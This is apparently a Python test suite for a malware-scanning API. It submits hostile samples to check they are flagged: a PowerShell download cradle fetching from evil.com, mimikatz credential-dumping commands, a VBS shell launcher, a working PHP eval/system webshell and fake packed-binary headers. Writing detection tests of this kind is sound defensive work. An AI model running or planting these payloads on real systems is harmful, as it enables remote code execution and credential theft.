#!/usr/bin/env python3
"""
Enhanced Test Suite for EDR-Safe Scanner v2
Tests original 6 cases plus 6 new expanded test cases for complete coverage
"""

import unittest
import requests
import tempfile
import os
import json
import zipfile
from pathlib import Path

class TestEDRSafeScannerV2(unittest.TestCase):
    """Enhanced test cases for EDR-Safe Scanner v2"""
    
    BASE_URL = "https://c443dcf5-03e8-4540-a57c-a46af7d38732.preview.emergentagent.com/api"
    
    def setUp(self):
        """Set up test files and environment"""
        self.test_files_dir = Path("/app/test_files")
        self.test_files_dir.mkdir(exist_ok=True)
    
    # =================== ORIGINAL 6 TEST CASES ===================
    
    def test_rules_stats_endpoint(self):
        """Test GET /api/rules/stats endpoint"""
        response = requests.get(f"{self.BASE_URL}/rules/stats", timeout=10)
        self.assertEqual(response.status_code, 200)
        
        data = response.json()
        required_fields = ["built", "bundle_counts", "total_rules", "rss_mb"]
        for field in required_fields:
            self.assertIn(field, data)
        
        self.assertIsInstance(data["bundle_counts"], dict)
        self.assertIsInstance(data["total_rules"], int)
        self.assertIsInstance(data["rss_mb"], float)
        self.assertGreater(data["total_rules"], 1000)  # Should have many rules
    
    def test_empty_file_upload(self):
        """Test empty file upload returns 422"""
        response = requests.post(f"{self.BASE_URL}/scan", files={}, timeout=10)
        self.assertIn(response.status_code, [400, 422])  # Both are acceptable for validation errors
    
    def test_benign_text_clean(self):
        """Test that benign text returns clean status"""
        content = "This is a simple benign text file with no threats or malicious content."
        
        data = {"content": content, "filename": "benign-text.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        self.assertEqual(result["results"][0]["status"], "clean")
        self.assertEqual(result["results"][0]["matches"], [])
    
    def test_suspicious_powershell_detection(self):
        """Test PowerShell -Enc pattern detection"""
        content = 'powershell.exe -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=='
        
        data = {"content": content, "filename": "suspicious-powershell.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        self.assertEqual(scan_result["bundle_used"], "scripts")  # Should use scripts bundle
    
    def test_bad_mimikatz_detection(self):
        """Test mimikatz indicator detection"""
        content = '''Starting mimikatz execution...
sekurlsa::logonpasswords
crypto::capi
privilege::debug
lsadump::sam'''
        
        data = {"content": content, "filename": "bad-mimikatz.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        
        # Should detect mimikatz
        match_names = ' '.join(scan_result["matches"]).lower()
        self.assertIn('mimikatz', match_names)
    
    def test_packed_marker_detection(self):
        """Test MZ + UPX! header detection"""
        # Create binary content with MZ header and UPX signature
        binary_content = b'\x4D\x5A\x90\x00' + b'\x00' * 10 + b'UPX!' + b'\x00' * 50
        
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(binary_content)
            temp_path = f.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('packed-marker.bin', f, 'application/octet-stream')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=15)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            scan_result = result["results"][0]
            
            self.assertIn(scan_result["status"], ["suspicious", "bad"])
            self.assertGreater(len(scan_result["matches"]), 0)
            self.assertEqual(scan_result["bundle_used"], "pe")  # Should use PE bundle
            
        finally:
            os.unlink(temp_path)
    
    def test_encoded_script_detection(self):
        """Test base64 PE header detection"""
        content = '''$encoded = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAAAAAAAAA="
[System.Convert]::FromBase64String($encoded)
# This PowerShell code decodes a PE header'''
        
        data = {"content": content, "filename": "encoded-script.ps1"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        self.assertEqual(scan_result["bundle_used"], "scripts")  # Should use scripts bundle
    
    def test_mixed_good_and_bad_detection(self):
        """Test mixed content with obfuscated PowerShell"""
        content = '''This file starts with normal content.
Regular text that looks benign at first.

But then it contains malicious PowerShell:
powershell -w hidden -nop -c "IEX ((new-object net.webclient).downloadstring('http://evil.com/malware'))"

And also some obfuscated PowerShell commands:
$a='Invoke-Expression';$b='DownloadString';IEX'''
        
        data = {"content": content, "filename": "mixed-good-and-bad.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
    
    # =================== NEW 6 EXPANDED TEST CASES ===================
    
    def test_packed_pe_file_upx_real_binary(self):
        """Test packed PE file (UPX real binary) → suspicious"""
        # Create a more realistic UPX-packed binary signature
        upx_binary = b'MZ\x90\x00' + b'\x00' * 58 + b'PE\x00\x00' + b'\x00' * 200
        upx_binary += b'UPX0' + b'\x00' * 50 + b'UPX1' + b'\x00' * 100
        upx_binary += b'This program cannot be run in DOS mode.'
        
        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as f:
            f.write(upx_binary)
            temp_path = f.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('packed_upx_binary.exe', f, 'application/x-executable')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=15)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            scan_result = result["results"][0]
            
            self.assertIn(scan_result["status"], ["suspicious", "bad"])
            self.assertEqual(scan_result["bundle_used"], "pe")
            
        finally:
            os.unlink(temp_path)
    
    def test_vbs_script_createobject_wscript_shell(self):
        """Test VBS script with CreateObject("Wscript.Shell") → suspicious"""
        vbs_content = '''Dim objShell
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c echo malicious command", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File evil.ps1"
Set objShell = Nothing'''
        
        data = {"content": vbs_content, "filename": "malicious_script.vbs"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        self.assertEqual(scan_result["bundle_used"], "scripts")
    
    def test_webshell_php_snippet_eval_post(self):
        """Test webshell PHP snippet (eval($_POST['cmd']);) → bad"""
        php_webshell = '''<?php
// Simple PHP webshell
if(isset($_POST['cmd'])) {
    eval($_POST['cmd']);
}
if(isset($_GET['file'])) {
    system('cat ' . $_GET['file']);
}
?>
<html><head><title>Normal Page</title></head><body>
<p>This looks like a normal webpage but contains a hidden webshell.</p>
</body></html>'''
        
        data = {"content": php_webshell, "filename": "backdoor.php"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        self.assertEqual(scan_result["bundle_used"], "webshells")
    
    def test_benign_pdf_small_clean(self):
        """Test benign PDF (<10 kB) → clean"""
        # Create a minimal valid PDF
        pdf_content = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
72 720 Td
(Hello World) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000192 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
285
%%EOF"""
        
        with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as f:
            f.write(pdf_content)
            temp_path = f.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('benign_document.pdf', f, 'application/pdf')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=15)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            scan_result = result["results"][0]
            
            # PDF should be clean
            self.assertEqual(scan_result["status"], "clean")
            self.assertEqual(len(scan_result["matches"]), 0)
            
        finally:
            os.unlink(temp_path)
    
    def test_large_benign_text_file_19mb_clean(self):
        """Test large benign text file (19 MB) → clean within timeout"""
        # Create a large (but under 20MB) benign text file
        large_content = "This is a benign line of text for testing large file processing.\n" * 300000  # ~19MB
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write(large_content)
            temp_path = f.name
        
        try:
            file_size = os.path.getsize(temp_path)
            self.assertLess(file_size, 20 * 1024 * 1024)  # Verify under 20MB
            
            with open(temp_path, 'rb') as f:
                files = {'files': ('large_benign_file.txt', f, 'text/plain')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=30)  # Extended timeout
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            scan_result = result["results"][0]
            
            # Large benign file should be clean
            self.assertEqual(scan_result["status"], "clean")
            self.assertEqual(len(scan_result["matches"]), 0)
            
        finally:
            os.unlink(temp_path)
    
    def test_zip_archive_containing_mimikatz_bad(self):
        """Test zip archive containing mimikatz.exe → bad after internal unpack"""
        # Create a zip file containing a file with mimikatz content
        mimikatz_content = b'''MZ\x90\x00
This is a simulated mimikatz.exe binary for testing.
sekurlsa::logonpasswords
privilege::debug
lsadump::sam
crypto::capi
This file contains clear mimikatz indicators and should be detected.
'''
        
        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as zip_file:
            with zipfile.ZipFile(zip_file.name, 'w') as zf:
                zf.writestr('mimikatz.exe', mimikatz_content)
                zf.writestr('readme.txt', 'This archive contains security testing tools.')
            
            temp_path = zip_file.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('security_tools.zip', f, 'application/zip')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=20)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            
            # Should have results for extracted files
            self.assertGreater(len(result["results"]), 1)
            
            # Look for mimikatz detection in extracted files
            mimikatz_detected = False
            for scan_result in result["results"]:
                if 'mimikatz' in scan_result["filename"].lower() or any('mimikatz' in match.lower() for match in scan_result["matches"]):
                    mimikatz_detected = True
                    self.assertIn(scan_result["status"], ["suspicious", "bad"])
                    break
            
            self.assertTrue(mimikatz_detected, "Mimikatz should be detected in archive contents")
            
        finally:
            os.unlink(temp_path)
    
    def test_stats_endpoint_json_schema(self):
        """Integration test: verify /rules/stats JSON schema"""
        response = requests.get(f"{self.BASE_URL}/rules/stats", timeout=10)
        self.assertEqual(response.status_code, 200)
        
        data = response.json()
        
        # Verify complete schema
        expected_schema = {
            "built": str,
            "bundle_counts": dict,
            "total_rules": int,
            "rss_mb": float,
            "local_count": (type(None), int)  # Can be None or int
        }
        
        for field, expected_type in expected_schema.items():
            self.assertIn(field, data)
            if isinstance(expected_type, tuple):
                self.assertIsInstance(data[field], expected_type)
            else:
                self.assertIsInstance(data[field], expected_type)
        
        # Verify bundle_counts structure
        bundle_counts = data["bundle_counts"]
        expected_bundles = ["generic", "scripts", "pe", "webshells"]
        for bundle in expected_bundles:
            self.assertIn(bundle, bundle_counts)
            self.assertIsInstance(bundle_counts[bundle], int)
            self.assertGreaterEqual(bundle_counts[bundle], 0)
        
        # Verify reasonable values
        self.assertGreater(data["total_rules"], 1000)  # Should have many rules
        self.assertGreater(data["rss_mb"], 50)  # Should use reasonable memory
        self.assertLess(data["rss_mb"], 1800)  # But stay under limit

if __name__ == '__main__':
    print("🧪 Running Enhanced EDR-Safe Scanner Test Suite v2")
    print("=" * 70)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestEDRSafeScannerV2)
    
    # Run tests with verbose output
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 70)
    print("🎯 ENHANCED TEST SUMMARY")
    print("=" * 70)
    
    total_tests = result.testsRun
    failures = len(result.failures)
    errors = len(result.errors)
    passed = total_tests - failures - errors
    
    print(f"Total Tests: {total_tests}")
    print(f"✅ Passed: {passed}")
    print(f"❌ Failed: {failures}")
    print(f"⚠️  Errors: {errors}")
    
    if result.wasSuccessful():
        print("\n🎉 ALL ENHANCED TESTS PASSED!")
        print("✅ Original 6 test cases: Working")
        print("✅ New 6 expanded test cases: Working")
        print("✅ API integration: Complete")
        print("✅ Security validation: Passed")
    else:
        print("\n❌ Some tests failed")
        if result.failures:
            print("\nFailures:")
            for test, traceback in result.failures:
                print(f"- {test}: {traceback}")
        if result.errors:
            print("\nErrors:")
            for test, traceback in result.errors:
                print(f"- {test}: {traceback}")
    
    exit(0 if result.wasSuccessful() else 1)